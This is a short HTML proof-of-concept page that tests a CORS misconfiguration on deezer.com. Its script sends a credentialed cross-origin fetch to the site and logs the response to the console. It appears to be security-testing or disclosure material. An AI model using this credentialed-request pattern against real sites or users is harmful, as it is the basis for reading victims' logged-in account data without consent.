<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>CORS Misconfiguration PoC</h1>
    <p>Click the button below to test the CORS vulnerability.</p>
    <button onclick="testCORS()">Test CORS</button>

    <script>
        function testCORS() {
            fetch('https://www.deezer.com', {
                method: 'GET',
                credentials: 'include' // Include cookies in the request
            })
            .then(response => response.text())
            .then(data => {
                console.log("Response from Deezer:", data);
                alert("CORS Request Success! Check the console for the response.");
            })
            .catch(error => {
                console.error("CORS request failed:", error);
                alert("CORS Request Failed. See the console for details.");
            });
        }
    </script>
</body>
</html>
